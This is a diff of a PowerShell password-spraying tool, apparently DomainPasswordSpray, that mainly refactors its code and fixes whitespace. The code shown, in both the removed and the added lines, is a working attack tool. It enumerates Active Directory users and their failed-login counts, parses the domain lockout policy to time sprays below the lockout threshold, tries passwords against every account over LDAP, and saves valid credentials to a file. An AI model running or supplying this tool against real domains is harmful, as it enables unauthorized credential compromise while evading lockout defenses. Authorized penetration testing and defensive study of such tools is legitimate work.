@@ -33,9 +33,9 @@ function Invoke-DomainPasswordSpray{
     .PARAMETER Domain
 
     The domain to spray against.
-    
+
     .PARAMETER Force
-    
+
     Forces the spray to continue and doesn't prompt for confirmation.
 
     .EXAMPLE
@@ -79,80 +79,28 @@ function Invoke-DomainPasswordSpray{
      $Domain = "",
 
      [Parameter(Position = 5, Mandatory = $false)]
-     [switch]     
+     [switch]
      $Force
     )
-    
-    if ($Domain -ne "")
-    {
-        Try 
-        {
-            #Using domain specified with -Domain option
-            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
-            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
-            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
-        }
-        catch 
-        {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."    
-            break
-        }
-    }
-    else 
-    {
-        Try 
-        {
-            #Trying to use the current user's domain
-            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
-            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
-        }
-        catch 
-        {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."    
-            break
-        }
-    }
-
-    if ($UserList -eq "")
-    {
-    $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts
-    }
-    else
-    {
-        #if a Userlist is specified use it and do not check for lockout thresholds
-        Write-Host "[*] Using $UserList as userlist to spray with"
-        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
-        $UserListArray = @()
-        try 
-        {
-            $UserListArray = Get-Content $UserList -ErrorAction stop
-        }
-        catch [Exception]{
-            Write-Host -ForegroundColor "red" "$_.Exception"
-            break
-        }
-    
-    }
 
     function TestPassword($CurrentDomain, $UserListArray, $Password)
     {
         $time = Get-Date
-        Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
-        Write-Host "[*] This might take a while depending on the total number of users"
-        $curr_user = 0
         $count = $UserListArray.count
+        Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
+        $curr_user = 0
 
         ForEach($User in $UserListArray){
             $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
             If ($Domain_check.name -ne $null)
             {
                 if ($OutFile -ne "")
-                {    
+                {
                     Add-Content $OutFile $User`:$Password
                 }
                 Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
             }
-            $curr_user+=1 
+            $curr_user+=1
             Write-Host -nonewline "$curr_user of $count users tested`r"
         }
         Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
@@ -162,32 +110,93 @@ function Invoke-DomainPasswordSpray{
         }
     }
 
+    function Get-ObservationWindow()
+    {
+        # Get account lockout observation window to avoid running more than 1
+        # password spray per observation window.
+        $command = "cmd.exe /C net accounts /domain"
+        $net_accounts_results = Invoke-Expression -Command:$command
+        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"})
+        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
+        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
+        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
+        return $observation_window
+    }
+
+    if ($Domain -ne "")
+    {
+        Try
+        {
+            # Using domain specified with -Domain option
+            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
+            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
+            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
+        }
+        catch
+        {
+            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."
+            break
+        }
+    }
+    else
+    {
+        Try
+        {
+            # Trying to use the current user's domain
+            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
+        }
+        catch
+        {
+            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
+            break
+        }
+    }
+
+    if ($UserList -eq "")
+    {
+        $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts
+    }
+    else
+    {
+        # if a Userlist is specified use it and do not check for lockout thresholds
+        Write-Host "[*] Using $UserList as userlist to spray with"
+        Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold."
+        $UserListArray = @()
+        try
+        {
+            $UserListArray = Get-Content $UserList -ErrorAction stop
+        }
+        catch [Exception]
+        {
+            Write-Host -ForegroundColor "red" "$_.Exception"
+            break
+        }
+
+    }
+
     # If a single password is selected do this
     if ($Password)
     {
         #if no force flag is set we will ask if the user is sure they want to spray
         if (!$Force)
         {
-        $title = "Confirm Password Spray"
-        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
+            $title = "Confirm Password Spray"
+            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
 
-        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-            "Attempts to authenticate 1 time per user in the list."
+            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
+                "Attempts to authenticate 1 time per user in the list."
 
-        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
-            "Cancels the password spray."
+            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
+                "Cancels the password spray."
 
-        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
+            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
 
-        $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
+            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
 
-        switch ($result)
+            switch ($result)
             {
-                0 
-                {
-                    TestPassword($CurrentDomain, $UserListArray, $Password)
-                
-                }
+                0 { TestPassword($CurrentDomain, $UserListArray, $Password) }
                 1 {"Cancelling the password spray."}
             }
         }
@@ -198,90 +207,84 @@ function Invoke-DomainPasswordSpray{
         }
 
 
-        
+
     }
         # If a password list is selected do this
-    ElseIf($PasswordList){
+    ElseIf($PasswordList)
+    {
         $Passwords = Get-Content $PasswordList
-        #Get account lockout observation window to avoid running more than 1 password spray per observation window.
-        $net_accounts = "cmd.exe /C net accounts /domain"
-        $net_accounts_results = Invoke-Expression -Command:$net_accounts
-        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"}) 
-        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
-        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
-        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
+        $observation_window = Get-ObservationWindow
 
-        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"    
+        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
         Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
         Write-Host "[*] Setting a $observation_window minute wait in between sprays."
-        
+
         #if no force flag is set we will ask if the user is sure they want to spray
         if (!$Force)
         {
-        $title = "Confirm Password Spray"
-        $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
+            $title = "Confirm Password Spray"
+            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"
 
-        $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
-            "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
+            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
+                "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."
 
-        $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
-            "Cancels the password spray."
+            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
+                "Cancels the password spray."
 
-        $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
+            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)
 
-        $result = $host.ui.PromptForChoice($title, $message, $options, 0) 
+            $result = $host.ui.PromptForChoice($title, $message, $options, 0)
 
-        switch ($result)
-        {
-            0 
+            switch ($result)
+            {
+                0
+                {
+                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
+                    Write-Host "[*] This might take a while depending on the total number of users"
+
+                    ForEach($Password_Item in $Passwords)
+                    {
+                        TestPassword($CurrentDomain, $UserListArray, $Password_Item)
+                    }
+                    Countdown-Timer -Seconds (60*$observation_window)
+
+                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
+                    if ($OutFile -ne "")
+                    {
+                        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
+                    }
+                }
+                1 {"Cancelling the password spray."}
+            }
+            #if the force flag is set we will not bother asking about proceeding with password spray.
+            if($Force)
             {
                 Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
                 Write-Host "[*] This might take a while depending on the total number of users"
 
                 ForEach($Password_Item in $Passwords)
                 {
-                    $time = Get-Date
-                    Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
                     TestPassword($CurrentDomain, $UserListArray, $Password_Item)
+                    Countdown-Timer -Seconds (60*$observation_window)
                 }
-                Countdown-Timer -Seconds (60*$observation_window)
-            
                 Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
                 if ($OutFile -ne "")
                 {
                     Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                 }
-            }
-            1 {"Cancelling the password spray."}
-        }
-        #if the force flag is set we will not bother asking about proceeding with password spray.
-        if($Force)
-        {
-            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
-            Write-Host "[*] This might take a while depending on the total number of users"
 
-            ForEach($Password_Item in $Passwords){
-                $time = Get-Date
-                Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
-                TestPassword($CurrentDomain, $UserListArray, $Password_Item)
-                Countdown-Timer -Seconds (60*$observation_window)
             }
-            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
-            if ($OutFile -ne "")
-            {
-                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
-            }
-                
         }
     }
-    Else{
-    Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
-    break
+    Else
+    {
+        Write-Host -ForegroundColor Red "The -Password or -PasswordList option must be specified"
+        break
     }
 }
 
 Function Countdown-Timer
-{   
+{
     Param(
         $Seconds = 1800,
         $Message = "[*] Pausing to avoid account lockout."
@@ -299,7 +302,7 @@ Function Get-DomainUserList{
     .SYNOPSIS
 
     This module gathers a userlist from the domain.
-    
+
     DomainPasswordSpray Function: Get-DomainUserList
     Author: Beau Bullock (@dafthack)
     License: BSD 3-Clause
@@ -316,12 +319,12 @@ Function Get-DomainUserList{
 
     .PARAMETER RemoveDisabled
 
-    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))   
-    
+    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))
+
     .PARAMETER RemovePotentialLockouts
-    
-    Removes accounts within 1 attempt of locking out. 
-    
+
+    Removes accounts within 1 attempt of locking out.
+
     .EXAMPLE
 
     C:\PS> Get-DomainUserList
@@ -329,7 +332,7 @@ Function Get-DomainUserList{
     Description
     -----------
     This command will gather a userlist from the domain including all samAccountType "805306368".
-    
+
     .EXAMPLE
 
     C:\PS> Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
@@ -337,48 +340,48 @@ Function Get-DomainUserList{
     Description
     -----------
     This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"
-    
+
     #>
     Param(
      [Parameter(Position = 0, Mandatory = $false)]
      [string]
      $Domain = "",
-     
+
      [Parameter(Position = 1, Mandatory = $false)]
      [switch]
      $RemoveDisabled,
-     
+
      [Parameter(Position = 2, Mandatory = $false)]
      [switch]
      $RemovePotentialLockouts
     )
-    
+
    if ($Domain -ne "")
     {
-        Try 
+        Try
         {
             #Using domain specified with -Domain option
             $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
             $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
         }
-        catch 
+        catch
         {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."    
+            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."
             break
         }
     }
-    else 
+    else
     {
-        Try 
+        Try
         {
             #Trying to use the current user's domain
             $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
         }
-        catch 
+        catch
         {
-            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."    
+            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
             break
         }
     }
@@ -419,19 +422,13 @@ Function Get-DomainUserList{
 
     }
 
-        #Get account lockout observation window to avoid running more than 1 password spray per observation window.
-        $net_accounts = "cmd.exe /C net accounts /domain"
-        $net_accounts_results = Invoke-Expression -Command:$net_accounts
-        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"}) 
-        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
-        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
-        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)
+        $observation_window = Get-ObservationWindow
 
         #Generate a userlist from the domain
-        #Selecting the lowest account lockout threshold in the domain to avoid locking out any accounts. 
+        #Selecting the lowest account lockout threshold in the domain to avoid locking out any accounts.
         [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
         Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
-        
+
         if ($SmallestLockoutThreshold -eq "0")
         {
             Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
@@ -440,7 +437,7 @@ Function Get-DomainUserList{
         {
             Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
         }
-        
+
         $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
         $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
         $UserSearcher.SearchRoot = $DirEntry
@@ -448,7 +445,7 @@ Function Get-DomainUserList{
         $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
         $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
         $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
-        
+
         If ($RemoveDisabled){
                 Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
                 # more precise LDAP filter UAC check for users that are disabled (Joff Thyer)
@@ -464,7 +461,7 @@ Function Get-DomainUserList{
         $AllUserObjects = $UserSearcher.FindAll()
         Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
         $UserListArray = @()
-        
+
         If ($RemovePotentialLockouts)
         {
         Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
@@ -487,9 +484,9 @@ Function Get-DomainUserList{
 
                 if ($badcount)
                 {
-                    
+
                     [int]$userbadcount = [convert]::ToInt32($badcount, 10)
-                    $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
+                    $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
                     #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
                     if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
                     {
@@ -506,7 +503,7 @@ Function Get-DomainUserList{
             $UserListArray += $samaccountname
             }
         }
-        
+
             Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
             return $UserListArray
 }
